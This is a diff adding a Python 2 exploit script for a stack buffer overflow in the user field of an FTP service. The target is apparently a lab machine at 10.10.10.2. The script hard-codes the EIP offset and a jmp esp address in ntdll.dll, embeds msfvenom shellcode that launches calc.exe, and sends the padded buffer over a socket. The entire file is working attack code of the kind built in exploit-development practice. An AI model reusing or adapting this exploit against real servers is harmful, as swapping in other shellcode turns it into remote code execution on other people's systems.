@@ -1,0 +1,65 @@
+#!/usr/bin/env python2
+
+import socket
+import struct
+
+# overflow is in user field and kicks off at a size of 1000
+# OFFSETS
+# EIP 251
+# EXP 263
+
+# jmp esp in ntll.dll at 0x77ace871
+
+RHOST = "10.10.10.2"
+RPORT = 21
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+
+# msfvenom -p windows/exec CMD=calc.exe -a x86 -f python --var-name shellcode_calc -b "\x00\x0A\x0D" EXIT_FUNC=thread
+
+shellcode_calc =  b""
+shellcode_calc += b"\xdd\xc1\xd9\x74\x24\xf4\xba\xd9\x74\x74"
+shellcode_calc += b"\x31\x5e\x2b\xc9\xb1\x31\x31\x56\x18\x83"
+shellcode_calc += b"\xc6\x04\x03\x56\xcd\x96\x81\xcd\x05\xd4"
+shellcode_calc += b"\x6a\x2e\xd5\xb9\xe3\xcb\xe4\xf9\x90\x98"
+shellcode_calc += b"\x56\xca\xd3\xcd\x5a\xa1\xb6\xe5\xe9\xc7"
+shellcode_calc += b"\x1e\x09\x5a\x6d\x79\x24\x5b\xde\xb9\x27"
+shellcode_calc += b"\xdf\x1d\xee\x87\xde\xed\xe3\xc6\x27\x13"
+shellcode_calc += b"\x09\x9a\xf0\x5f\xbc\x0b\x75\x15\x7d\xa7"
+shellcode_calc += b"\xc5\xbb\x05\x54\x9d\xba\x24\xcb\x96\xe4"
+shellcode_calc += b"\xe6\xed\x7b\x9d\xae\xf5\x98\x98\x79\x8d"
+shellcode_calc += b"\x6a\x56\x78\x47\xa3\x97\xd7\xa6\x0c\x6a"
+shellcode_calc += b"\x29\xee\xaa\x95\x5c\x06\xc9\x28\x67\xdd"
+shellcode_calc += b"\xb0\xf6\xe2\xc6\x12\x7c\x54\x23\xa3\x51"
+shellcode_calc += b"\x03\xa0\xaf\x1e\x47\xee\xb3\xa1\x84\x84"
+shellcode_calc += b"\xcf\x2a\x2b\x4b\x46\x68\x08\x4f\x03\x2a"
+shellcode_calc += b"\x31\xd6\xe9\x9d\x4e\x08\x52\x41\xeb\x42"
+shellcode_calc += b"\x7e\x96\x86\x08\x14\x69\x14\x37\x5a\x69"
+shellcode_calc += b"\x26\x38\xca\x02\x17\xb3\x85\x55\xa8\x16"
+shellcode_calc += b"\xe2\xaa\xe2\x3b\x42\x23\xab\xa9\xd7\x2e"
+shellcode_calc += b"\x4c\x04\x1b\x57\xcf\xad\xe3\xac\xcf\xc7"
+shellcode_calc += b"\xe6\xe9\x57\x3b\x9a\x62\x32\x3b\x09\x82"
+shellcode_calc += b"\x17\x58\xcc\x10\xfb\xb1\x6b\x91\x9e\xcd"
+
+buf_length = 1000
+eip_offset = 251
+jmp_esp = 0x77ACE871
+nop_sled = "\x90" * 32
+
+badchars = [0x00, 0x0A, 0x0D]
+
+padding = "A" * eip_offset
+eip = struct.pack("<I", jmp_esp)
+filler = "C" * 8
+esp = "D" * (buf_length - len(padding) - len(eip) - len(filler) - len(shellcode_calc) - len(nop_sled))
+
+buf = padding + eip + filler + nop_sled + shellcode_calc + esp
+
+
+data = s.recv(1024)
+s.send(buf + "\r\n")
+data = s.recv(1024)
+
+s.close()
+
